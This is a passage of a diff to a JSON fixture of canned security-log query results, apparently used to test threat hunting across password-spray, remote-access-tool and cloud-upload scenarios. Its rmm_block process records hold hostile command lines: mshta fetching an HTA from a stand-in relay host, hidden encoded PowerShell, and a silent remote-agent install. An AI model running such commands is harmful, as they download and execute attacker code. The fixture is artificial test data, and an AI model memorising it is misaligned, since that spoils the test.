@@ -508,6 +508,217 @@
               "$regex": "(?i)SigninLogs|AADSignInEvents|IdentityLogonEvents"
             },
             {
+              "$regex": "192\\.0\\.2\\.44"
+            }
+          ]
+        }
+      },
+      "response": {
+        "schema": [
+          {
+            "name": "Timestamp",
+            "type": "DateTime"
+          },
+          {
+            "name": "ActionType",
+            "type": "String"
+          },
+          {
+            "name": "AccountUpn",
+            "type": "String"
+          },
+          {
+            "name": "AccountObjectId",
+            "type": "String"
+          },
+          {
+            "name": "Application",
+            "type": "String"
+          },
+          {
+            "name": "ClientAppUsed",
+            "type": "String"
+          },
+          {
+            "name": "AuthenticationRequirement",
+            "type": "String"
+          },
+          {
+            "name": "ConditionalAccessStatus",
+            "type": "String"
+          },
+          {
+            "name": "IPAddress",
+            "type": "String"
+          },
+          {
+            "name": "Country",
+            "type": "String"
+          },
+          {
+            "name": "City",
+            "type": "String"
+          },
+          {
+            "name": "ErrorCode",
+            "type": "Int32"
+          },
+          {
+            "name": "FailureReason",
+            "type": "String"
+          },
+          {
+            "name": "UserAgent",
+            "type": "String"
+          },
+          {
+            "name": "Latitude",
+            "type": "Real"
+          },
+          {
+            "name": "Longitude",
+            "type": "Real"
+          }
+        ],
+        "results": [
+          {
+            "Timestamp": "2026-09-14T06:09:14.000Z",
+            "ActionType": "LogonFailed",
+            "AccountUpn": "hmoreau@contoso.com",
+            "AccountObjectId": "1a2b3c4d-0001-4f06-9e1a-5d4c3b2a1f01",
+            "Application": "Office 365 Exchange Online",
+            "ClientAppUsed": "Other clients",
+            "AuthenticationRequirement": "singleFactorAuthentication",
+            "ConditionalAccessStatus": "notApplied",
+            "IPAddress": "192.0.2.44",
+            "Country": "NG",
+            "City": "Lagos",
+            "ErrorCode": 50126,
+            "FailureReason": "Invalid username or password",
+            "UserAgent": "BAV2ROPC",
+            "Latitude": 6.5244,
+            "Longitude": 3.3792
+          },
+          {
+            "Timestamp": "2026-09-14T06:16:52.000Z",
+            "ActionType": "LogonFailed",
+            "AccountUpn": "kpatel@contoso.com",
+            "AccountObjectId": "1a2b3c4d-0002-4f06-9e1a-5d4c3b2a1f02",
+            "Application": "Office 365 Exchange Online",
+            "ClientAppUsed": "Other clients",
+            "AuthenticationRequirement": "singleFactorAuthentication",
+            "ConditionalAccessStatus": "notApplied",
+            "IPAddress": "192.0.2.44",
+            "Country": "NG",
+            "City": "Lagos",
+            "ErrorCode": 50126,
+            "FailureReason": "Invalid username or password",
+            "UserAgent": "BAV2ROPC",
+            "Latitude": 6.5244,
+            "Longitude": 3.3792
+          },
+          {
+            "Timestamp": "2026-09-14T06:23:07.000Z",
+            "ActionType": "LogonFailed",
+            "AccountUpn": "sokafor@contoso.com",
+            "AccountObjectId": "1a2b3c4d-0003-4f06-9e1a-5d4c3b2a1f03",
+            "Application": "Office 365 Exchange Online",
+            "ClientAppUsed": "Other clients",
+            "AuthenticationRequirement": "singleFactorAuthentication",
+            "ConditionalAccessStatus": "notApplied",
+            "IPAddress": "192.0.2.44",
+            "Country": "NG",
+            "City": "Lagos",
+            "ErrorCode": 50126,
+            "FailureReason": "Invalid username or password",
+            "UserAgent": "BAV2ROPC",
+            "Latitude": 6.5244,
+            "Longitude": 3.3792
+          },
+          {
+            "Timestamp": "2026-09-14T06:30:41.000Z",
+            "ActionType": "LogonFailed",
+            "AccountUpn": "lgruber@contoso.com",
+            "AccountObjectId": "1a2b3c4d-0004-4f06-9e1a-5d4c3b2a1f04",
+            "Application": "Office 365 Exchange Online",
+            "ClientAppUsed": "Other clients",
+            "AuthenticationRequirement": "singleFactorAuthentication",
+            "ConditionalAccessStatus": "notApplied",
+            "IPAddress": "192.0.2.44",
+            "Country": "NG",
+            "City": "Lagos",
+            "ErrorCode": 50126,
+            "FailureReason": "Invalid username or password",
+            "UserAgent": "BAV2ROPC",
+            "Latitude": 6.5244,
+            "Longitude": 3.3792
+          },
+          {
+            "Timestamp": "2026-09-14T06:38:19.000Z",
+            "ActionType": "LogonFailed",
+            "AccountUpn": "nfischer@contoso.com",
+            "AccountObjectId": "1a2b3c4d-0005-4f06-9e1a-5d4c3b2a1f05",
+            "Application": "Office 365 Exchange Online",
+            "ClientAppUsed": "Other clients",
+            "AuthenticationRequirement": "singleFactorAuthentication",
+            "ConditionalAccessStatus": "notApplied",
+            "IPAddress": "192.0.2.44",
+            "Country": "NG",
+            "City": "Lagos",
+            "ErrorCode": 50126,
+            "FailureReason": "Invalid username or password",
+            "UserAgent": "BAV2ROPC",
+            "Latitude": 6.5244,
+            "Longitude": 3.3792
+          },
+          {
+            "Timestamp": "2026-09-14T06:41:03.000Z",
+            "ActionType": "LogonSuccess",
+            "AccountUpn": "rbennett@contoso.com",
+            "AccountObjectId": "7c3e9a51-2b8d-4f06-9e1a-5d4c3b2a1f00",
+            "Application": "Office 365 Exchange Online",
+            "ClientAppUsed": "Other clients",
+            "AuthenticationRequirement": "singleFactorAuthentication",
+            "ConditionalAccessStatus": "notApplied",
+            "IPAddress": "192.0.2.44",
+            "Country": "NG",
+            "City": "Lagos",
+            "ErrorCode": 0,
+            "FailureReason": "",
+            "UserAgent": "BAV2ROPC",
+            "Latitude": 6.5244,
+            "Longitude": 3.3792
+          },
+          {
+            "Timestamp": "2026-09-14T06:46:58.000Z",
+            "ActionType": "LogonSuccess",
+            "AccountUpn": "rbennett@contoso.com",
+            "AccountObjectId": "7c3e9a51-2b8d-4f06-9e1a-5d4c3b2a1f00",
+            "Application": "Office 365 Exchange Online",
+            "ClientAppUsed": "Browser",
+            "AuthenticationRequirement": "singleFactorAuthentication",
+            "ConditionalAccessStatus": "notApplied",
+            "IPAddress": "192.0.2.44",
+            "Country": "NG",
+            "City": "Lagos",
+            "ErrorCode": 0,
+            "FailureReason": "",
+            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+            "Latitude": 6.5244,
+            "Longitude": 3.3792
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "password_spray",
+      "match": {
+        "query": {
+          "$all": [
+            {
+              "$regex": "(?i)SigninLogs|AADSignInEvents|IdentityLogonEvents"
+            },
+            {
               "$regex": "(?i)ErrorCode|ResultType|FailureReason|LogonFailed|failed|failure|50126"
             },
             {
@@ -1561,6 +1772,976 @@
             "DestinationDeviceName": "dc01.contoso.com",
             "ReportId": 70314,
             "AdditionalFields": "{\"ServiceName\": \"LDAP/dc01.contoso.com\", \"TicketEncryptionType\": \"0x12 (AES256)\", \"TicketOptions\": \"0x40810010\", \"FailureCode\": \"0x0\"}"
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "rmm_block",
+      "match": {
+        "query": {
+          "$all": [
+            {
+              "$regex": "(?i)DeviceProcessEvents"
+            },
+            {
+              "$regex": "(?i)ws-fin-0042|pnovak"
+            }
+          ]
+        }
+      },
+      "response": {
+        "schema": [
+          {
+            "name": "Timestamp",
+            "type": "DateTime"
+          },
+          {
+            "name": "DeviceName",
+            "type": "String"
+          },
+          {
+            "name": "ActionType",
+            "type": "String"
+          },
+          {
+            "name": "FileName",
+            "type": "String"
+          },
+          {
+            "name": "FolderPath",
+            "type": "String"
+          },
+          {
+            "name": "ProcessId",
+            "type": "Int64"
+          },
+          {
+            "name": "ProcessCommandLine",
+            "type": "String"
+          },
+          {
+            "name": "ProcessCreationTime",
+            "type": "DateTime"
+          },
+          {
+            "name": "AccountName",
+            "type": "String"
+          },
+          {
+            "name": "SHA256",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessFileName",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessId",
+            "type": "Int64"
+          },
+          {
+            "name": "InitiatingProcessCommandLine",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessParentFileName",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessParentId",
+            "type": "Int64"
+          },
+          {
+            "name": "ReportId",
+            "type": "Int64"
+          }
+        ],
+        "results": [
+          {
+            "Timestamp": "2026-09-14T08:41:10.000Z",
+            "DeviceName": "ws-fin-0042.contoso.com",
+            "ActionType": "ProcessCreated",
+            "FileName": "mshta.exe",
+            "FolderPath": "C:\\Windows\\System32",
+            "ProcessId": 4412,
+            "ProcessCommandLine": "mshta.exe https://relay.example.net/invoice.hta",
+            "ProcessCreationTime": "2026-09-14T08:41:10.000Z",
+            "AccountName": "pnovak",
+            "SHA256": "6d1d8b5c0f0f4c2c9e1a1b2c3d4e5f60718293a4b5c6d7e8f9a0b1c2d3e4f5a6",
+            "InitiatingProcessFileName": "outlook.exe",
+            "InitiatingProcessId": 3120,
+            "InitiatingProcessCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+            "InitiatingProcessParentFileName": "explorer.exe",
+            "InitiatingProcessParentId": 2044,
+            "ReportId": 91401
+          },
+          {
+            "Timestamp": "2026-09-14T08:41:12.000Z",
+            "DeviceName": "ws-fin-0042.contoso.com",
+            "ActionType": "ProcessCreated",
+            "FileName": "powershell.exe",
+            "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+            "ProcessId": 4480,
+            "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
+            "ProcessCreationTime": "2026-09-14T08:41:12.000Z",
+            "AccountName": "pnovak",
+            "SHA256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c",
+            "InitiatingProcessFileName": "mshta.exe",
+            "InitiatingProcessId": 4412,
+            "InitiatingProcessCommandLine": "mshta.exe https://relay.example.net/invoice.hta",
+            "InitiatingProcessParentFileName": "outlook.exe",
+            "InitiatingProcessParentId": 3120,
+            "ReportId": 91402
+          },
+          {
+            "Timestamp": "2026-09-14T08:41:15.000Z",
+            "DeviceName": "ws-fin-0042.contoso.com",
+            "ActionType": "ProcessCreated",
+            "FileName": "RemoteSupport.ClientSetup.exe",
+            "FolderPath": "C:\\Users\\pnovak\\AppData\\Local\\Temp",
+            "ProcessId": 4530,
+            "ProcessCommandLine": "RemoteSupport.ClientSetup.exe /silent /password=Hunter2! /relay=relay.example.net",
+            "ProcessCreationTime": "2026-09-14T08:41:15.000Z",
+            "AccountName": "pnovak",
+            "SHA256": "3f5a9c1e7b2d4f6a8c0e1b3d5f7a9c2e4b6d8f0a1c3e5b7d9f1a3c5e7b9d1f3a",
+            "InitiatingProcessFileName": "mshta.exe",
+            "InitiatingProcessId": 4412,
+            "InitiatingProcessCommandLine": "mshta.exe https://relay.example.net/invoice.hta",
+            "InitiatingProcessParentFileName": "outlook.exe",
+            "InitiatingProcessParentId": 3120,
+            "ReportId": 91403
+          },
+          {
+            "Timestamp": "2026-09-14T08:47:16.000Z",
+            "DeviceName": "ws-fin-0042.contoso.com",
+            "ActionType": "ProcessCreated",
+            "FileName": "RemoteSupport.Agent.exe",
+            "FolderPath": "C:\\Users\\pnovak\\AppData\\Local\\RemoteSupport",
+            "ProcessId": 5088,
+            "ProcessCommandLine": "RemoteSupport.Agent.exe --relay relay.example.net --unattended",
+            "ProcessCreationTime": "2026-09-14T08:47:16.000Z",
+            "AccountName": "pnovak",
+            "SHA256": "a7c3e9f1b5d2486a0c4e8f2b6d1a3c5e7f9b0d2a4c6e8f1b3d5a7c9e0f2b4d6a",
+            "InitiatingProcessFileName": "RemoteSupport.ClientSetup.exe",
+            "InitiatingProcessId": 4530,
+            "InitiatingProcessCommandLine": "RemoteSupport.ClientSetup.exe /silent /password=Hunter2! /relay=relay.example.net",
+            "InitiatingProcessParentFileName": "mshta.exe",
+            "InitiatingProcessParentId": 4412,
+            "ReportId": 91404
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "rmm_block",
+      "match": {
+        "query": {
+          "$all": [
+            {
+              "$regex": "(?i)\\bDeviceEvents\\b"
+            },
+            {
+              "$regex": "(?i)ws-fin-0042|pnovak"
+            }
+          ]
+        }
+      },
+      "response": {
+        "schema": [
+          {
+            "name": "Timestamp",
+            "type": "DateTime"
+          },
+          {
+            "name": "DeviceName",
+            "type": "String"
+          },
+          {
+            "name": "ActionType",
+            "type": "String"
+          },
+          {
+            "name": "FileName",
+            "type": "String"
+          },
+          {
+            "name": "FolderPath",
+            "type": "String"
+          },
+          {
+            "name": "SHA256",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessFileName",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessId",
+            "type": "Int64"
+          },
+          {
+            "name": "InitiatingProcessCommandLine",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessAccountName",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessParentFileName",
+            "type": "String"
+          },
+          {
+            "name": "ReportId",
+            "type": "Int64"
+          },
+          {
+            "name": "AdditionalFields",
+            "type": "String"
+          }
+        ],
+        "results": [
+          {
+            "Timestamp": "2026-09-14T08:47:17.000Z",
+            "DeviceName": "ws-fin-0042.contoso.com",
+            "ActionType": "AntivirusDetection",
+            "FileName": "RemoteSupport.Agent.exe",
+            "FolderPath": "C:\\Users\\pnovak\\AppData\\Local\\RemoteSupport",
+            "SHA256": "a7c3e9f1b5d2486a0c4e8f2b6d1a3c5e7f9b0d2a4c6e8f1b3d5a7c9e0f2b4d6a",
+            "InitiatingProcessFileName": "RemoteSupport.ClientSetup.exe",
+            "InitiatingProcessId": 4530,
+            "InitiatingProcessCommandLine": "RemoteSupport.ClientSetup.exe /silent /password=Hunter2! /relay=relay.example.net",
+            "InitiatingProcessAccountName": "pnovak",
+            "InitiatingProcessParentFileName": "mshta.exe",
+            "ReportId": 91405,
+            "AdditionalFields": "{\"ThreatName\":\"PUA:Win32/RemoteSupport\",\"WasRemediated\":\"true\",\"WasExecutingWhileDetected\":\"false\",\"Severity\":\"Medium\"}"
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "rmm_block",
+      "match": {
+        "query": {
+          "$all": [
+            {
+              "$regex": "(?i)SigninLogs|AADSignInEvents|IdentityLogonEvents"
+            },
+            {
+              "$regex": "(?i)pnovak"
+            }
+          ]
+        }
+      },
+      "response": {
+        "schema": [
+          {
+            "name": "Timestamp",
+            "type": "DateTime"
+          },
+          {
+            "name": "ActionType",
+            "type": "String"
+          },
+          {
+            "name": "AccountUpn",
+            "type": "String"
+          },
+          {
+            "name": "AccountObjectId",
+            "type": "String"
+          },
+          {
+            "name": "Application",
+            "type": "String"
+          },
+          {
+            "name": "ClientAppUsed",
+            "type": "String"
+          },
+          {
+            "name": "AuthenticationRequirement",
+            "type": "String"
+          },
+          {
+            "name": "ConditionalAccessStatus",
+            "type": "String"
+          },
+          {
+            "name": "IPAddress",
+            "type": "String"
+          },
+          {
+            "name": "Country",
+            "type": "String"
+          },
+          {
+            "name": "City",
+            "type": "String"
+          },
+          {
+            "name": "ErrorCode",
+            "type": "Int32"
+          },
+          {
+            "name": "FailureReason",
+            "type": "String"
+          },
+          {
+            "name": "UserAgent",
+            "type": "String"
+          },
+          {
+            "name": "Latitude",
+            "type": "Real"
+          },
+          {
+            "name": "Longitude",
+            "type": "Real"
+          }
+        ],
+        "results": [
+          {
+            "Timestamp": "2026-09-14T07:58:22.000Z",
+            "ActionType": "LogonSuccess",
+            "AccountUpn": "pnovak@contoso.com",
+            "AccountObjectId": "5e8d1c3a-7b2f-4a9e-8c6d-1f0b3a5e7c91",
+            "Application": "Office 365 Exchange Online",
+            "ClientAppUsed": "Mobile Apps and Desktop clients",
+            "AuthenticationRequirement": "multiFactorAuthentication",
+            "ConditionalAccessStatus": "success",
+            "IPAddress": "10.20.31.42",
+            "Country": "GB",
+            "City": "London",
+            "ErrorCode": 0,
+            "FailureReason": "",
+            "UserAgent": "Microsoft Office/16.0",
+            "Latitude": 51.5074,
+            "Longitude": -0.1278
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "cloud_upload",
+      "match": {
+        "query": {
+          "$all": [
+            {
+              "$regex": "(?i)CloudAppEvents|DeviceFileEvents|UrlClickEvents|OfficeActivity"
+            },
+            {
+              "$regex": "(?i)dlarsen"
+            },
+            {
+              "$regex": "(?i)summarize|count\\(|sum\\("
+            }
+          ]
+        }
+      },
+      "response": {
+        "schema": [
+          {
+            "name": "min_Timestamp",
+            "type": "DateTime"
+          },
+          {
+            "name": "max_Timestamp",
+            "type": "DateTime"
+          },
+          {
+            "name": "Application",
+            "type": "String"
+          },
+          {
+            "name": "AccountUpn",
+            "type": "String"
+          },
+          {
+            "name": "count_",
+            "type": "Int64"
+          },
+          {
+            "name": "sum_FileSize",
+            "type": "Int64"
+          },
+          {
+            "name": "dcount_ObjectName",
+            "type": "Int64"
+          },
+          {
+            "name": "make_set_UrlDomain",
+            "type": "Dynamic"
+          },
+          {
+            "name": "make_set_ActionType",
+            "type": "Dynamic"
+          }
+        ],
+        "results": [
+          {
+            "min_Timestamp": "2026-09-14T09:12:03.000Z",
+            "max_Timestamp": "2026-09-14T11:38:47.000Z",
+            "Application": "PhotoDrive",
+            "AccountUpn": "dlarsen@contoso.com",
+            "count_": 2340,
+            "sum_FileSize": 6657199308,
+            "dcount_ObjectName": 2340,
+            "make_set_UrlDomain": [
+              "upload.photodrive.example"
+            ],
+            "make_set_ActionType": [
+              "FileUploaded"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "cloud_upload",
+      "match": {
+        "query": {
+          "$all": [
+            {
+              "$regex": "(?i)CloudAppEvents|DeviceFileEvents|UrlClickEvents|OfficeActivity"
+            },
+            {
+              "$regex": "(?i)dlarsen"
+            }
+          ]
+        }
+      },
+      "response": {
+        "schema": [
+          {
+            "name": "Timestamp",
+            "type": "DateTime"
+          },
+          {
+            "name": "ActionType",
+            "type": "String"
+          },
+          {
+            "name": "Application",
+            "type": "String"
+          },
+          {
+            "name": "AccountUpn",
+            "type": "String"
+          },
+          {
+            "name": "AccountObjectId",
+            "type": "String"
+          },
+          {
+            "name": "IPAddress",
+            "type": "String"
+          },
+          {
+            "name": "ObjectName",
+            "type": "String"
+          },
+          {
+            "name": "ObjectType",
+            "type": "String"
+          },
+          {
+            "name": "FileSize",
+            "type": "Int64"
+          },
+          {
+            "name": "UrlDomain",
+            "type": "String"
+          },
+          {
+            "name": "ActivityObjects",
+            "type": "Dynamic"
+          },
+          {
+            "name": "ReportId",
+            "type": "Int64"
+          },
+          {
+            "name": "RawEventData",
+            "type": "Dynamic"
+          }
+        ],
+        "results": [
+          {
+            "Timestamp": "2026-09-14T09:12:03.000Z",
+            "ActionType": "FileUploaded",
+            "Application": "PhotoDrive",
+            "AccountUpn": "dlarsen@contoso.com",
+            "AccountObjectId": "9b4e2f7c-3d1a-4c8e-b6f0-2a5d7e9c1b34",
+            "IPAddress": "10.20.61.117",
+            "ObjectName": "IMG_4471.jpg",
+            "ObjectType": "File",
+            "FileSize": 3145728,
+            "UrlDomain": "upload.photodrive.example",
+            "ActivityObjects": [
+              {
+                "Type": "File",
+                "Name": "IMG_4471.jpg",
+                "ContentType": "image/jpeg"
+              }
+            ],
+            "ReportId": 93000,
+            "RawEventData": {
+              "Operation": "FileUploaded",
+              "SourcePath": "C:\\Users\\dlarsen\\Pictures\\Camera Roll\\IMG_4471.jpg",
+              "ClientIP": "10.20.61.117"
+            }
+          },
+          {
+            "Timestamp": "2026-09-14T09:12:05.000Z",
+            "ActionType": "FileUploaded",
+            "Application": "PhotoDrive",
+            "AccountUpn": "dlarsen@contoso.com",
+            "AccountObjectId": "9b4e2f7c-3d1a-4c8e-b6f0-2a5d7e9c1b34",
+            "IPAddress": "10.20.61.117",
+            "ObjectName": "IMG_4472.jpg",
+            "ObjectType": "File",
+            "FileSize": 2998272,
+            "UrlDomain": "upload.photodrive.example",
+            "ActivityObjects": [
+              {
+                "Type": "File",
+                "Name": "IMG_4472.jpg",
+                "ContentType": "image/jpeg"
+              }
+            ],
+            "ReportId": 93001,
+            "RawEventData": {
+              "Operation": "FileUploaded",
+              "SourcePath": "C:\\Users\\dlarsen\\Pictures\\Camera Roll\\IMG_4472.jpg",
+              "ClientIP": "10.20.61.117"
+            }
+          },
+          {
+            "Timestamp": "2026-09-14T09:12:08.000Z",
+            "ActionType": "FileUploaded",
+            "Application": "PhotoDrive",
+            "AccountUpn": "dlarsen@contoso.com",
+            "AccountObjectId": "9b4e2f7c-3d1a-4c8e-b6f0-2a5d7e9c1b34",
+            "IPAddress": "10.20.61.117",
+            "ObjectName": "IMG_4473.HEIC",
+            "ObjectType": "File",
+            "FileSize": 2411520,
+            "UrlDomain": "upload.photodrive.example",
+            "ActivityObjects": [
+              {
+                "Type": "File",
+                "Name": "IMG_4473.HEIC",
+                "ContentType": "image/heic"
+              }
+            ],
+            "ReportId": 93002,
+            "RawEventData": {
+              "Operation": "FileUploaded",
+              "SourcePath": "C:\\Users\\dlarsen\\Pictures\\Camera Roll\\IMG_4473.HEIC",
+              "ClientIP": "10.20.61.117"
+            }
+          },
+          {
+            "Timestamp": "2026-09-14T09:12:11.000Z",
+            "ActionType": "FileUploaded",
+            "Application": "PhotoDrive",
+            "AccountUpn": "dlarsen@contoso.com",
+            "AccountObjectId": "9b4e2f7c-3d1a-4c8e-b6f0-2a5d7e9c1b34",
+            "IPAddress": "10.20.61.117",
+            "ObjectName": "IMG_4474.HEIC",
+            "ObjectType": "File",
+            "FileSize": 2506752,
+            "UrlDomain": "upload.photodrive.example",
+            "ActivityObjects": [
+              {
+                "Type": "File",
+                "Name": "IMG_4474.HEIC",
+                "ContentType": "image/heic"
+              }
+            ],
+            "ReportId": 93003,
+            "RawEventData": {
+              "Operation": "FileUploaded",
+              "SourcePath": "C:\\Users\\dlarsen\\Pictures\\Camera Roll\\IMG_4474.HEIC",
+              "ClientIP": "10.20.61.117"
+            }
+          },
+          {
+            "Timestamp": "2026-09-14T09:12:14.000Z",
+            "ActionType": "FileUploaded",
+            "Application": "PhotoDrive",
+            "AccountUpn": "dlarsen@contoso.com",
+            "AccountObjectId": "9b4e2f7c-3d1a-4c8e-b6f0-2a5d7e9c1b34",
+            "IPAddress": "10.20.61.117",
+            "ObjectName": "IMG_4475.jpg",
+            "ObjectType": "File",
+            "FileSize": 3276800,
+            "UrlDomain": "upload.photodrive.example",
+            "ActivityObjects": [
+              {
+                "Type": "File",
+                "Name": "IMG_4475.jpg",
+                "ContentType": "image/jpeg"
+              }
+            ],
+            "ReportId": 93004,
+            "RawEventData": {
+              "Operation": "FileUploaded",
+              "SourcePath": "C:\\Users\\dlarsen\\Pictures\\Camera Roll\\IMG_4475.jpg",
+              "ClientIP": "10.20.61.117"
+            }
+          },
+          {
+            "Timestamp": "2026-09-14T09:12:19.000Z",
+            "ActionType": "FileUploaded",
+            "Application": "PhotoDrive",
+            "AccountUpn": "dlarsen@contoso.com",
+            "AccountObjectId": "9b4e2f7c-3d1a-4c8e-b6f0-2a5d7e9c1b34",
+            "IPAddress": "10.20.61.117",
+            "ObjectName": "IMG_4476.MOV",
+            "ObjectType": "File",
+            "FileSize": 48234496,
+            "UrlDomain": "upload.photodrive.example",
+            "ActivityObjects": [
+              {
+                "Type": "File",
+                "Name": "IMG_4476.MOV",
+                "ContentType": "video/quicktime"
+              }
+            ],
+            "ReportId": 93005,
+            "RawEventData": {
+              "Operation": "FileUploaded",
+              "SourcePath": "C:\\Users\\dlarsen\\Pictures\\Camera Roll\\IMG_4476.MOV",
+              "ClientIP": "10.20.61.117"
+            }
+          },
+          {
+            "Timestamp": "2026-09-14T09:12:31.000Z",
+            "ActionType": "FileUploaded",
+            "Application": "PhotoDrive",
+            "AccountUpn": "dlarsen@contoso.com",
+            "AccountObjectId": "9b4e2f7c-3d1a-4c8e-b6f0-2a5d7e9c1b34",
+            "IPAddress": "10.20.61.117",
+            "ObjectName": "IMG_4477.jpg",
+            "ObjectType": "File",
+            "FileSize": 3014656,
+            "UrlDomain": "upload.photodrive.example",
+            "ActivityObjects": [
+              {
+                "Type": "File",
+                "Name": "IMG_4477.jpg",
+                "ContentType": "image/jpeg"
+              }
+            ],
+            "ReportId": 93006,
+            "RawEventData": {
+              "Operation": "FileUploaded",
+              "SourcePath": "C:\\Users\\dlarsen\\Pictures\\Camera Roll\\IMG_4477.jpg",
+              "ClientIP": "10.20.61.117"
+            }
+          },
+          {
+            "Timestamp": "2026-09-14T09:12:34.000Z",
+            "ActionType": "FileUploaded",
+            "Application": "PhotoDrive",
+            "AccountUpn": "dlarsen@contoso.com",
+            "AccountObjectId": "9b4e2f7c-3d1a-4c8e-b6f0-2a5d7e9c1b34",
+            "IPAddress": "10.20.61.117",
+            "ObjectName": "IMG_4478.jpg",
+            "ObjectType": "File",
+            "FileSize": 2883584,
+            "UrlDomain": "upload.photodrive.example",
+            "ActivityObjects": [
+              {
+                "Type": "File",
+                "Name": "IMG_4478.jpg",
+                "ContentType": "image/jpeg"
+              }
+            ],
+            "ReportId": 93007,
+            "RawEventData": {
+              "Operation": "FileUploaded",
+              "SourcePath": "C:\\Users\\dlarsen\\Pictures\\Camera Roll\\IMG_4478.jpg",
+              "ClientIP": "10.20.61.117"
+            }
+          },
+          {
+            "Timestamp": "2026-09-14T09:12:37.000Z",
+            "ActionType": "FileUploaded",
+            "Application": "PhotoDrive",
+            "AccountUpn": "dlarsen@contoso.com",
+            "AccountObjectId": "9b4e2f7c-3d1a-4c8e-b6f0-2a5d7e9c1b34",
+            "IPAddress": "10.20.61.117",
+            "ObjectName": "IMG_4479.HEIC",
+            "ObjectType": "File",
+            "FileSize": 2359296,
+            "UrlDomain": "upload.photodrive.example",
+            "ActivityObjects": [
+              {
+                "Type": "File",
+                "Name": "IMG_4479.HEIC",
+                "ContentType": "image/heic"
+              }
+            ],
+            "ReportId": 93008,
+            "RawEventData": {
+              "Operation": "FileUploaded",
+              "SourcePath": "C:\\Users\\dlarsen\\Pictures\\Camera Roll\\IMG_4479.HEIC",
+              "ClientIP": "10.20.61.117"
+            }
+          },
+          {
+            "Timestamp": "2026-09-14T09:12:40.000Z",
+            "ActionType": "FileUploaded",
+            "Application": "PhotoDrive",
+            "AccountUpn": "dlarsen@contoso.com",
+            "AccountObjectId": "9b4e2f7c-3d1a-4c8e-b6f0-2a5d7e9c1b34",
+            "IPAddress": "10.20.61.117",
+            "ObjectName": "IMG_4480.jpg",
+            "ObjectType": "File",
+            "FileSize": 3080192,
+            "UrlDomain": "upload.photodrive.example",
+            "ActivityObjects": [
+              {
+                "Type": "File",
+                "Name": "IMG_4480.jpg",
+                "ContentType": "image/jpeg"
+              }
+            ],
+            "ReportId": 93009,
+            "RawEventData": {
+              "Operation": "FileUploaded",
+              "SourcePath": "C:\\Users\\dlarsen\\Pictures\\Camera Roll\\IMG_4480.jpg",
+              "ClientIP": "10.20.61.117"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "cloud_upload",
+      "match": {
+        "query": {
+          "$all": [
+            {
+              "$regex": "(?i)DeviceNetworkEvents"
+            },
+            {
+              "$regex": "(?i)ws-mkt-0117|dlarsen"
+            }
+          ]
+        }
+      },
+      "response": {
+        "schema": [
+          {
+            "name": "Timestamp",
+            "type": "DateTime"
+          },
+          {
+            "name": "DeviceName",
+            "type": "String"
+          },
+          {
+            "name": "ActionType",
+            "type": "String"
+          },
+          {
+            "name": "RemoteUrl",
+            "type": "String"
+          },
+          {
+            "name": "RemoteIP",
+            "type": "String"
+          },
+          {
+            "name": "RemotePort",
+            "type": "Int32"
+          },
+          {
+            "name": "LocalIP",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessFileName",
+            "type": "String"
+          },
+          {
+            "name": "InitiatingProcessAccountName",
+            "type": "String"
+          },
+          {
+            "name": "ReportId",
+            "type": "Int64"
+          }
+        ],
+        "results": [
+          {
+            "Timestamp": "2026-09-14T09:11:58.000Z",
+            "DeviceName": "ws-mkt-0117.contoso.com",
+            "ActionType": "ConnectionSuccess",
+            "RemoteUrl": "upload.photodrive.example",
+            "RemoteIP": "2001:db8:9e00::4c",
+            "RemotePort": 443,
+            "LocalIP": "10.20.61.117",
+            "InitiatingProcessFileName": "msedge.exe",
+            "InitiatingProcessAccountName": "dlarsen",
+            "ReportId": 93100
+          },
+          {
+            "Timestamp": "2026-09-14T09:41:02.000Z",
+            "DeviceName": "ws-mkt-0117.contoso.com",
+            "ActionType": "ConnectionSuccess",
+            "RemoteUrl": "upload.photodrive.example",
+            "RemoteIP": "2001:db8:9e00::4c",
+            "RemotePort": 443,
+            "LocalIP": "10.20.61.117",
+            "InitiatingProcessFileName": "msedge.exe",
+            "InitiatingProcessAccountName": "dlarsen",
+            "ReportId": 93101
+          },
+          {
+            "Timestamp": "2026-09-14T10:12:40.000Z",
+            "DeviceName": "ws-mkt-0117.contoso.com",
+            "ActionType": "ConnectionSuccess",
+            "RemoteUrl": "upload.photodrive.example",
+            "RemoteIP": "2001:db8:9e00::4c",
+            "RemotePort": 443,
+            "LocalIP": "10.20.61.117",
+            "InitiatingProcessFileName": "msedge.exe",
+            "InitiatingProcessAccountName": "dlarsen",
+            "ReportId": 93102
+          },
+          {
+            "Timestamp": "2026-09-14T10:55:16.000Z",
+            "DeviceName": "ws-mkt-0117.contoso.com",
+            "ActionType": "ConnectionSuccess",
+            "RemoteUrl": "upload.photodrive.example",
+            "RemoteIP": "2001:db8:9e00::4c",
+            "RemotePort": 443,
+            "LocalIP": "10.20.61.117",
+            "InitiatingProcessFileName": "msedge.exe",
+            "InitiatingProcessAccountName": "dlarsen",
+            "ReportId": 93103
+          },
+          {
+            "Timestamp": "2026-09-14T11:31:09.000Z",
+            "DeviceName": "ws-mkt-0117.contoso.com",
+            "ActionType": "ConnectionSuccess",
+            "RemoteUrl": "upload.photodrive.example",
+            "RemoteIP": "2001:db8:9e00::4c",
+            "RemotePort": 443,
+            "LocalIP": "10.20.61.117",
